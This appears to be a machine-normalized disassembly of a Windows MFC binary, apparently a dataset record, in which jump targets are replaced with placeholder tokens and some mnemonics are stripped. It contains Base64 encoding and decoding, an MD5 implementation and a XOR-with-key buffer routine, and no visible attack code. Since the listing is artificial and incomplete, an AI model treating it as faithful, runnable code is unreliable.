sub_401010
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax 0x55555556
mov bl [ esp + 0x10 ]
lea ecx [ esi * 4 ]
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
test bl 0x1
mov ecx edx
jne r-xdata
mov eax 0x6bca1af3
push edi
imul ecx
sar edx 0x5
mov eax edx
mov edi 0x4c
shr eax 0x1f
lea esi [ edx + eax + 0x1 ]
mov eax ecx
cdq
idiv edi
pop edi
test edx edx
je r-xdata
mov eax esi
mov esi 0x3
cdq
idiv esi
add ecx edx
test bl 0x2
lea eax [ ecx + esi * 2 ]
je r-xdata
and edx 0x80000003
jns r-xdata
pop esi
pop ebx
retn 0x8
mov eax ecx
je r-xdata
dec edx
or edx 0xfffffffc
inc edx
mov eax 0x4
sub eax edx
add ecx eax
sub_401090
sub esp 0x8
push ebx
mov ebx [ esp + 0x10 ]
push ebp
xor ebp ebp
cmp ebx ebp
push edi
je r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn 0x14
mov edi [ esp + 0x20 ]
cmp edi ebp
je r-xdata
cmp [ esp + 0x24 ] ebp
je r-xdata
mov eax 0x55555556
push esi
imul [ esp + 0x20 ]
mov eax edx
mov [ esp + 0x1c ] ebp
shr eax 0x1f
add edx eax
mov eax 0x6bca1af3
shl edx 0x2
mov [ esp + 0x10 ] edx
imul edx
sar edx 0x5
mov ecx edx
mov esi 0x13
shr ecx 0x1f
add edx ecx
mov ecx edx
mov [ esp + 0x14 ] ecx
js r-xdata
mov eax [ esp + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov esi edx
test esi esi
je r-xdata
cmp ebp ecx
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x1c ]
pop esi
pop edi
mov [ ecx ] eax
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn 0x14
lea ebp [ esi + 0x1 ]
test ebp ebp
je r-xdata
test esi esi
jle r-xdata
mov eax [ esp + 0x10 ]
mov esi 0x4c
cdq
idiv esi
mov eax edx
cdq
and edx 0x3
add eax edx
mov esi eax
sar esi 0x2
xor eax eax
xor ecx ecx
mov edx [ esp + 0x1c ]
inc ebp
cmp ebp ecx
lea eax [ edx + esi * 4 ]
mov [ esp + 0x1c ] eax
jle r-xdata
mov [ esp + 0x24 ] esi
shl eax 0x8
inc ecx
cmp ecx 0x3
jl r-xdata
xor edx edx
mov dl [ ebx ]
or eax edx
inc ebx
jne r-xdata
xor eax eax
mov al [ ebx ]
or ecx eax
inc ebx
shl ecx 0x8
dec edx
jne r-xdata
mov edx 0x4
cmp ecx esi
jge r-xdata
test ebp ebp
jle r-xdata
mov eax ecx
shr eax 0x1a
inc edi
mov al [ eax + r--data ]
mov [ edi - 0x1 ] al
shl ecx 0x6
dec edx
jne r-xdata
mov eax [ esp + 0x24 ]
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov al [ esp + 0x2c ]
add ecx ebp
test al 0x1
mov [ esp + 0x1c ] ecx
jne r-xdata
mov ecx ebp
xor ecx ecx
mov edx 0x3
mov ecx [ esp + 0x14 ]
mov edx 0x4
sub edx ebp
test edx edx
jle r-xdata
mov edx eax
shr edx 0x1a
inc edi
mov dl [ edx + r--data ]
mov [ edi - 0x1 ] dl
shl eax 0x6
dec ecx
jne r-xdata
add [ esp + 0x1c ] edx
mov ecx edx
mov eax 0x3d3d3d3d
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
sub_401210
mov eax [ esp + 0x4 ]
cmp eax 0x41
jb r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
cmp eax 0x30
jb r-xdata
cmp eax 0x7a
ja r-xdata
add eax 0xffffffbf
retn 0x4
cmp eax 0x2d
jne r-xdata
cmp eax 0x39
ja r-xdata
add eax 0xffffffb9
retn 0x4
sub eax 0x2f
neg eax
sbb eax eax
and al 0xc0
add eax 0x3f
retn 0x4
mov eax 0x3e
retn 0x4
add eax 0x4
retn 0x4
sub_401260
push ecx
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
mov [ esp + 0x4 ] ecx
je r-xdata
xor eax eax
pop ebx
pop ecx
retn 0x10
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
add eax ebx
cmp ebx eax
mov [ esp + 0x10 ] eax
jae r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
pop ebx
mov [ ecx ] eax
mov eax 0x1
pop ecx
retn 0x10
push ebp
push esi
push edi
mov eax edi
mov ecx 0x18
cdq
and edx 0x7
sub ecx edi
add eax edx
sar eax 0x3
shl esi cl
test eax eax
jle r-xdata
movsx ecx [ ebx ]
push ecx
mov ecx [ esp + 0x14 ]
call sub_401210
inc ebx
cmp eax 0xffffffff
jne r-xdata
cmp ebx [ esp + 0x1c ]
jb r-xdata
add [ esp + 0x18 ] eax
shl esi 0x6
or esi eax
add edi 0x6
dec ebp
jmp r-xdata
xor esi esi
xor edi edi
xor ebp ebp
pop edi
pop esi
pop ebp
mov edi [ esp + 0x20 ]
mov edx esi
shr edx 0x10
mov [ edi ] dl
shl esi 0x8
inc edi
dec eax
mov [ esp + 0x20 ] edi
jne r-xdata
cmp ebx [ esp + 0x1c ]
jae r-xdata
inc ebp
cmp ebp 0x4
jl r-xdata
sub_401330
sub esp 0x80
push esi
mov edx ecx
push edi
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x48 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x49 ]
mov esi [ esp + 0x8c ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
test eax eax
jle r-xdata
lea ecx [ esp + 0x48 ]
push ecx
push eax
lea eax [ esp + 0x10 ]
mov ecx edx
push eax
call sub_401530
mov esi [ esp + 0x94 ]
mov edi [ esp + 0x98 ]
push esi
lea ecx [ esp + 0x4c ]
push edi
push ecx
call sub_402380
add esp 0xc
test esi esi
jle r-xdata
push ebp
mov ebp ecx
lea edi [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x80
retn 0x10
mov ecx [ esp + 0x90 ]
push ebx
mov eax edi
sub ecx edi
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_4013f0
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
push ebx
call Ordinal_MFC42_823
mov ebp [ esp + 0x28 ]
add esp 0x4
mov esi eax
mov eax [ esp + 0x18 ]
push ebp
push esi
push ebx
push eax
mov ecx edi
mov [ ebp ] ebx
call sub_401510
mov ecx [ esp + 0x20 ]
mov edx [ ebp ]
mov eax [ esp + 0x14 ]
push ecx
push edx
push esi
push eax
mov ecx edi
call sub_401330
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x14
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401450
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
push ebx
call Ordinal_MFC42_823
mov ecx [ esp + 0x18 ]
add esp 0x4
mov esi eax
mov eax [ esp + 0x18 ]
push esi
push ebx
push eax
push ecx
mov ecx edi
call sub_401330
push ebx
mov ecx edi
call sub_4014c0
mov ebp [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ebp
push edx
push ebx
push esi
mov ecx edi
mov [ ebp ] eax
call sub_4014e0
mov eax [ ebp ]
mov ecx [ esp + 0x20 ]
test esi esi
mov [ eax + ecx ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x14
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401580
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x1c ]
mov ecx [ esi + 0x10 ]
mov eax ecx
lea edx [ edi * 8 ]
shr eax 0x3
lea ecx [ ecx + edi * 8 ]
and eax 0x3f
cmp ecx edx
mov [ esi + 0x10 ] ecx
jae r-xdata
mov ebx [ esi + 0x14 ]
mov ecx edi
shr ecx 0x1d
add ebx ecx
mov [ esi + 0x14 ] ebx
mov ebx 0x40
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebp ebp
mov edx [ esp + 0x18 ]
push ebx
lea eax [ eax + esi + 0x18 ]
push edx
push eax
call sub_402090
lea ecx [ esi + 0x18 ]
push ecx
push esi
call sub_4016a0
mov ebp ebx
add ebx 0x3f
add esp 0x14
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0x18 ]
lea eax [ edx + ebx - 0x3f ]
push eax
push esi
call sub_4016a0
add ebx 0x40
add esp 0x8
add ebp 0x40
cmp ebx edi
jb r-xdata
mov ecx [ esp + 0x18 ]
sub edi ebp
add ebp ecx
push edi
lea edx [ eax + esi + 0x18 ]
push ebp
push edx
call sub_402090
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
sub_401630
sub esp 0x8
lea eax [ esp ]
push esi
push edi
mov edi [ esp + 0x18 ]
push 0x8
lea esi [ edi + 0x10 ]
push esi
push eax
call sub_401ff0
mov eax [ esi ]
add esp 0xc
shr eax 0x3
and eax 0x3f
mov ecx 0x38
cmp eax 0x38
jb r-xdata
sub ecx eax
push ecx
push rw-data
push edi
call sub_401580
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
push edi
call sub_401580
mov edx [ esp + 0x2c ]
push 0x10
push edi
push edx
call sub_401ff0
push 0x58
push 0x0
push edi
call sub_4020b0
add esp 0x30
pop edi
pop esi
add esp 0x8
retn
mov ecx 0x78
sub_4016a0
sub esp 0x40
mov ecx [ esp + 0x48 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x50 ]
push edi
push 0x40
lea edx [ esp + 0x14 ]
mov eax [ esi ]
mov edi [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
mov ebp [ esi + 0xc ]
push ecx
push edx
mov [ esp + 0x60 ] eax
call sub_402040
mov eax edi
mov edx [ esp + 0x60 ]
not eax
mov ecx ebx
and eax ebp
and ecx edi
or eax ecx
mov ecx [ esp + 0x1c ]
add eax ecx
lea ecx [ edx + eax - 0x28955b88 ]
mov edx edi
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
add eax edi
mov ecx eax
and edx eax
not ecx
and ecx ebx
or ecx edx
mov edx [ esp + 0x20 ]
add ecx edx
lea edx [ ecx + ebp - 0x173848aa ]
mov ecx edx
shr ecx 0x14
shl edx 0xc
or ecx edx
add ecx eax
mov edx ecx
mov ebp ecx
not edx
and edx edi
and ebp eax
or edx ebp
mov ebp [ esp + 0x24 ]
add edx ebp
mov ebp ecx
lea ebx [ ebx + edx + 0x242070db ]
mov edx ebx
shr edx 0xf
shl ebx 0x11
or edx ebx
add edx ecx
mov ebx edx
and ebp edx
not ebx
and ebx eax
or ebx ebp
mov ebp [ esp + 0x28 ]
add ebx ebp
lea ebx [ edi + ebx - 0x3e423112 ]
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
mov ebx edx
add edi edx
mov [ esp + 0x60 ] edi
mov ebp [ esp + 0x60 ]
not edi
and edi ecx
and ebx ebp
mov ebp [ esp + 0x2c ]
or edi ebx
add edi ebp
mov ebx [ esp + 0x60 ]
mov ebp ebx
lea eax [ eax + edi - 0xa83f051 ]
mov edi eax
shr edi 0x19
shl eax 0x7
or edi eax
add edi ebx
mov eax edi
and ebp edi
not eax
and eax edx
or eax ebp
mov ebp [ esp + 0x30 ]
add eax ebp
lea ecx [ ecx + eax + 0x4787c62a ]
mov eax ecx
shr eax 0x14
shl ecx 0xc
or eax ecx
add eax edi
mov ecx eax
mov ebp eax
not ecx
and ecx ebx
and ebp edi
or ecx ebp
mov ebp [ esp + 0x34 ]
add ecx ebp
mov ebp eax
lea edx [ edx + ecx - 0x57cfb9ed ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
add ecx eax
mov edx ecx
and ebp ecx
not edx
and edx edi
or edx ebp
mov ebp [ esp + 0x38 ]
add edx ebp
lea ebx [ ebx + edx - 0x2b96aff ]
mov edx ebx
shl edx 0x16
shr ebx 0xa
or edx ebx
mov ebx ecx
add edx ecx
mov [ esp + 0x60 ] edx
mov ebp [ esp + 0x60 ]
not edx
and edx eax
and ebx ebp
mov ebp [ esp + 0x3c ]
or edx ebx
add edx ebp
mov ebx [ esp + 0x60 ]
mov ebp ebx
lea edi [ edi + edx + 0x698098d8 ]
mov edx edi
shr edx 0x19
shl edi 0x7
or edx edi
add edx ebx
mov edi edx
and ebp edx
not edi
and edi ecx
or edi ebp
mov ebp [ esp + 0x40 ]
add edi ebp
lea eax [ eax + edi - 0x74bb0851 ]
mov edi eax
shr edi 0x14
shl eax 0xc
or edi eax
add edi edx
mov eax edi
not eax
mov ebp edi
and eax ebx
and ebp edx
or eax ebp
mov ebp [ esp + 0x44 ]
add eax ebp
mov ebp edi
lea ecx [ ecx + eax - 0xa44f ]
mov eax ecx
shr eax 0xf
shl ecx 0x11
or eax ecx
add eax edi
mov ecx eax
and ebp eax
not ecx
and ecx edx
or ecx ebp
mov ebp [ esp + 0x48 ]
add ecx ebp
lea ebx [ ebx + ecx - 0x76a32842 ]
mov ecx ebx
shl ecx 0x16
shr ebx 0xa
or ecx ebx
mov ebx eax
add ecx eax
mov [ esp + 0x60 ] ecx
mov ebp [ esp + 0x60 ]
not ecx
and ecx edi
and ebx ebp
mov ebp [ esp + 0x4c ]
or ecx ebx
add ecx ebp
mov ebx [ esp + 0x60 ]
mov ebp ebx
lea edx [ edx + ecx + 0x6b901122 ]
mov ecx edx
shr ecx 0x19
shl edx 0x7
or ecx edx
add ecx ebx
mov edx ecx
and ebp ecx
not edx
and edx eax
or edx ebp
mov ebp [ esp + 0x50 ]
add edx ebp
lea edi [ edi + edx - 0x2678e6d ]
mov edx edi
shr edx 0x14
shl edi 0xc
or edx edi
add edx ecx
mov ebp edx
mov edi edx
not ebp
and edi ecx
and ebx ebp
or edi ebx
mov ebx [ esp + 0x54 ]
add edi ebx
mov ebx edx
lea eax [ eax + edi - 0x5986bc72 ]
mov edi eax
shr edi 0xf
shl eax 0x11
or edi eax
add edi edx
mov eax edi
and ebx edi
not eax
mov [ esp + 0x64 ] eax
and eax ecx
or eax ebx
mov ebx [ esp + 0x58 ]
add eax ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + eax + 0x49b40821 ]
mov eax ebx
shl eax 0x16
shr ebx 0xa
or eax ebx
mov ebx edx
add eax edi
mov [ esp + 0x60 ] eax
and ebx eax
mov eax edi
and eax ebp
mov ebp [ esp + 0x20 ]
or ebx eax
add ebx ebp
mov ebp edi
lea ecx [ ecx + ebx - 0x9e1da9e ]
mov ebx [ esp + 0x60 ]
mov eax ecx
shr eax 0x1b
shl ecx 0x5
or eax ecx
mov ecx [ esp + 0x64 ]
add eax ebx
and ecx ebx
and ebp eax
or ecx ebp
mov ebp [ esp + 0x34 ]
add ecx ebp
mov ebp [ esp + 0x60 ]
not ebx
lea edx [ edx + ecx - 0x3fbf4cc0 ]
and ebx eax
mov ecx edx
shr ecx 0x17
shl edx 0x9
or ecx edx
add ecx eax
mov edx ecx
and edx ebp
mov ebp [ esp + 0x48 ]
or ebx edx
add ebx ebp
lea edi [ edi + ebx + 0x265e5a51 ]
mov edx edi
shr edx 0x12
shl edi 0xe
or edx edi
mov edi eax
add edx ecx
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
mov ebx [ esp + 0x1c ]
add edi ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + edi - 0x16493856 ]
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
mov ebx ecx
add edi edx
mov [ esp + 0x60 ] edi
mov edi ecx
mov ebp [ esp + 0x60 ]
not edi
and edi edx
and ebx ebp
mov ebp [ esp + 0x30 ]
or edi ebx
add edi ebp
mov ebx [ esp + 0x60 ]
lea eax [ eax + edi - 0x29d0efa3 ]
mov edi eax
shr edi 0x1b
shl eax 0x5
or edi eax
mov eax edx
add edi ebx
not eax
mov ebp edx
and eax ebx
and ebp edi
or eax ebp
mov ebp [ esp + 0x44 ]
add eax ebp
mov ebp [ esp + 0x60 ]
not ebx
lea ecx [ ecx + eax + 0x2441453 ]
and ebx edi
mov eax ecx
shr eax 0x17
shl ecx 0x9
or eax ecx
add eax edi
mov ecx eax
and ecx ebp
mov ebp [ esp + 0x58 ]
or ebx ecx
add ebx ebp
lea edx [ edx + ebx - 0x275e197f ]
mov ecx edx
shr ecx 0x12
shl edx 0xe
or ecx edx
mov edx edi
add ecx eax
not edx
mov ebx ecx
and edx eax
and ebx edi
or edx ebx
mov ebx [ esp + 0x2c ]
add edx ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + edx - 0x182c0438 ]
mov edx ebx
shl edx 0x14
shr ebx 0xc
or edx ebx
mov ebx eax
add edx ecx
mov [ esp + 0x60 ] edx
mov edx eax
mov ebp [ esp + 0x60 ]
not edx
and edx ecx
and ebx ebp
mov ebp [ esp + 0x40 ]
or edx ebx
add edx ebp
mov ebx [ esp + 0x60 ]
mov ebp ecx
lea edi [ edi + edx + 0x21e1cde6 ]
mov edx edi
shr edx 0x1b
shl edi 0x5
or edx edi
mov edi ecx
add edx ebx
not edi
and edi ebx
and ebp edx
or edi ebp
mov ebp [ esp + 0x54 ]
add edi ebp
mov ebp [ esp + 0x60 ]
not ebx
lea eax [ eax + edi - 0x3cc8f82a ]
and ebx edx
mov edi eax
shr edi 0x17
shl eax 0x9
or edi eax
add edi edx
mov eax edi
and eax ebp
mov ebp [ esp + 0x28 ]
or ebx eax
add ebx ebp
lea ecx [ ecx + ebx - 0xb2af279 ]
mov eax ecx
shr eax 0x12
shl ecx 0xe
or eax ecx
mov ecx edx
add eax edi
not ecx
mov ebx eax
and ecx edi
and ebx edx
or ecx ebx
mov ebx [ esp + 0x3c ]
add ecx ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + ecx + 0x455a14ed ]
mov ecx ebx
shl ecx 0x14
shr ebx 0xc
or ecx ebx
mov ebx edi
add ecx eax
mov [ esp + 0x60 ] ecx
mov ecx edi
mov ebp [ esp + 0x60 ]
not ecx
and ecx eax
and ebx ebp
mov ebp [ esp + 0x50 ]
or ecx ebx
add ecx ebp
mov ebx [ esp + 0x60 ]
mov ebp eax
lea edx [ edx + ecx - 0x561c16fb ]
mov ecx edx
shr ecx 0x1b
shl edx 0x5
or ecx edx
mov edx eax
add ecx ebx
not edx
and edx ebx
and ebp ecx
or edx ebp
mov ebp [ esp + 0x24 ]
add edx ebp
mov ebp [ esp + 0x60 ]
not ebx
lea edi [ edi + edx - 0x3105c08 ]
and ebx ecx
mov edx edi
shr edx 0x17
shl edi 0x9
or edx edi
add edx ecx
mov edi edx
and edi ebp
mov ebp [ esp + 0x38 ]
or ebx edi
add ebx ebp
lea eax [ eax + ebx + 0x676f02d9 ]
mov edi eax
shr edi 0x12
shl eax 0xe
or edi eax
mov eax ecx
add edi edx
not eax
mov ebx edi
and eax edx
and ebx ecx
or eax ebx
mov ebx [ esp + 0x4c ]
add eax ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + eax - 0x72d5b376 ]
mov eax ebx
shl eax 0x14
shr ebx 0xc
or eax ebx
add eax edi
mov ebp [ esp + 0x30 ]
mov ebx edx
xor ebx edi
xor ebx eax
add ebx ebp
mov ebp [ esp + 0x3c ]
lea ecx [ ecx + ebx - 0x5c6be ]
mov ebx ecx
shr ebx 0x1c
shl ecx 0x4
or ebx ecx
mov ecx edi
add ebx eax
xor ecx eax
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x48 ]
lea ecx [ edx + ecx - 0x788e097f ]
mov edx ecx
shr edx 0x15
shl ecx 0xb
or edx ecx
add edx ebx
mov ecx edx
xor ecx eax
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x54 ]
lea ecx [ edi + ecx + 0x6d9d6122 ]
mov edi ecx
shr edi 0x10
shl ecx 0x10
or edi ecx
mov ecx edx
add edi edx
xor ecx edi
mov [ esp + 0x60 ] ecx
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x20 ]
lea eax [ eax + ecx - 0x21ac7f4 ]
mov ecx eax
shl ecx 0x17
shr eax 0x9
or ecx eax
mov eax [ esp + 0x60 ]
add ecx edi
xor eax ecx
add eax ebp
mov ebp [ esp + 0x2c ]
lea ebx [ ebx + eax - 0x5b4115bc ]
mov eax ebx
shr eax 0x1c
shl ebx 0x4
or eax ebx
mov ebx edi
add eax ecx
xor ebx ecx
xor ebx eax
add ebx ebp
mov ebp [ esp + 0x38 ]
lea edx [ edx + ebx + 0x4bdecfa9 ]
mov ebx edx
shr ebx 0x15
shl edx 0xb
or ebx edx
add ebx eax
mov edx ebx
xor edx ecx
xor edx eax
add edx ebp
lea edi [ edi + edx - 0x944b4a0 ]
mov edx edi
shr edx 0x10
shl edi 0x10
or edx edi
mov edi ebx
add edx ebx
xor edi edx
mov ebp edi
xor ebp eax
add ebp [ esp + 0x44 ]
lea ebp [ ecx + ebp - 0x41404390 ]
mov ecx ebp
shl ecx 0x17
shr ebp 0x9
or ecx ebp
mov ebp [ esp + 0x50 ]
add ecx edx
xor edi ecx
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi edx
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x28 ]
lea ebx [ ebx + edi - 0x155ed806 ]
mov edi ebx
shr edi 0x15
shl ebx 0xb
or edi ebx
add edi eax
mov ebx edi
xor ebx ecx
xor ebx eax
add ebx ebp
lea edx [ edx + ebx - 0x2b10cf7b ]
mov ebx edx
shr ebx 0x10
shl edx 0x10
or ebx edx
mov edx edi
add ebx edi
xor edx ebx
mov ebp edx
xor ebp eax
add ebp [ esp + 0x34 ]
lea ebp [ ecx + ebp + 0x4881d05 ]
mov ecx ebp
shl ecx 0x17
shr ebp 0x9
or ecx ebp
mov ebp [ esp + 0x40 ]
add ecx ebx
xor edx ecx
add edx ebp
lea edx [ eax + edx - 0x262b2fc7 ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx ebx
add eax ecx
xor edx ecx
xor edx eax
add edx [ esp + 0x4c ]
lea edi [ edi + edx - 0x1924661b ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi [ esp + 0x58 ]
lea ebx [ ebx + edi + 0x1fa27cf8 ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
mov ebx edx
add edi edx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x24 ]
lea ecx [ ecx + ebx - 0x3b53a99b ]
mov ebx ecx
shl ebx 0x17
shr ecx 0x9
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x1c ]
lea eax [ eax + ecx - 0xbd6ddbc ]
mov ecx eax
shr ecx 0x1a
shl eax 0x6
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x38 ]
lea edx [ edx + eax + 0x432aff97 ]
mov eax edx
shr eax 0x16
shl edx 0xa
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x54 ]
lea edi [ edi + edx - 0x546bdc59 ]
mov edx edi
shr edx 0x11
shl edi 0xf
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x30 ]
lea ebx [ ebx + edi - 0x36c5fc7 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx eax
add edi edx
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x4c ]
lea ecx [ ecx + ebx + 0x655b59c3 ]
mov ebx ecx
shr ebx 0x1a
shl ecx 0x6
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x28 ]
lea eax [ eax + ecx - 0x70f3336e ]
mov ecx eax
shr ecx 0x16
shl eax 0xa
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x44 ]
lea edx [ edx + eax - 0x100b83 ]
mov eax edx
shr eax 0x11
shl edx 0xf
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x20 ]
lea edi [ edi + edx - 0x7a7ba22f ]
mov edx edi
shl edx 0x15
shr edi 0xb
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x3c ]
lea ebx [ ebx + edi + 0x6fa87e4f ]
mov edi ebx
shr edi 0x1a
shl ebx 0x6
or edi ebx
mov ebx eax
add edi edx
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x58 ]
lea ecx [ ecx + ebx - 0x1d31920 ]
mov ebx ecx
shr ebx 0x16
shl ecx 0xa
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x34 ]
lea eax [ eax + ecx - 0x5cfebcec ]
mov ecx eax
shr ecx 0x11
shl eax 0xf
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x50 ]
lea edx [ edx + eax + 0x4e0811a1 ]
mov eax edx
shl eax 0x15
shr edx 0xb
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x2c ]
lea edi [ edi + edx - 0x8ac817e ]
mov edx edi
shr edx 0x1a
shl edi 0x6
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x48 ]
lea ebx [ ebx + edi - 0x42c50dcb ]
mov edi ebx
shr edi 0x16
shl ebx 0xa
or edi ebx
mov ebx eax
add edi edx
not ebx
or ebx edi
push 0x40
xor ebx edx
push 0x0
add ebx [ esp + 0x2c ]
lea ecx [ ecx + ebx + 0x2ad7d2bb ]
mov ebx ecx
shr ebx 0x11
shl ecx 0xf
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx ebp
mov ebp [ esi + 0x8 ]
add ebp ebx
lea eax [ eax + ecx - 0x14792c6f ]
mov ecx [ esi ]
add ecx edx
mov edx eax
shl edx 0x15
shr eax 0xb
or edx eax
mov eax [ esi + 0x4 ]
add edx ebx
mov ebx [ esi + 0xc ]
add eax edx
add ebx edi
mov [ esi + 0x4 ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esi ] ecx
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebx
call sub_4020b0
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn
sub_401ff0
push edi
mov edi [ esp + 0x10 ]
test edi edi
jbe r-xdata
pop edi
retn
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
push esi
or esi 0xffffffff
lea eax [ edx + 0x1 ]
sub esi edx
mov dl [ ecx ]
add ecx 0x4
mov [ eax - 0x1 ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x8
mov [ eax ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x10
mov [ eax + 0x1 ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x18
mov [ eax + 0x2 ] dl
add eax 0x4
lea edx [ esi + eax ]
cmp edx edi
jb r-xdata
pop esi
sub_402040
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
jbe r-xdata
pop ebp
retn
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi 0xfffffffe
lea eax [ ecx + 0x2 ]
sub edi ecx
xor ecx ecx
xor edx edx
mov ch [ eax + 0x1 ]
mov dl [ eax - 0x1 ]
mov cl [ eax ]
add eax 0x4
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax - 0x6 ]
add esi 0x4
shl ecx 0x8
or ecx edx
mov [ esi - 0x4 ] ecx
lea ecx [ edi + eax ]
cmp ecx ebp
jb r-xdata
pop edi
pop esi
sub_402090
push esi
mov esi [ esp + 0x10 ]
test esi esi
jbe r-xdata
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_4020b0
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
retn
mov al [ esp + 0x8 ]
push ebx
mov bl al
mov edx ecx
mov bh bl
push edi
mov edi [ esp + 0xc ]
mov eax ebx
shl eax 0x10
mov ax bx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_402110
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x10 ]
test ebx ebx
mov [ esi ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov cl [ edi ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call sub_4020e0
mov dx [ esp + 0x18 ]
add esp 0x8
mov [ esi ] dx
add esi 0x2
inc edi
dec ebx
jne r-xdata
sub_402150
sub esp 0x68
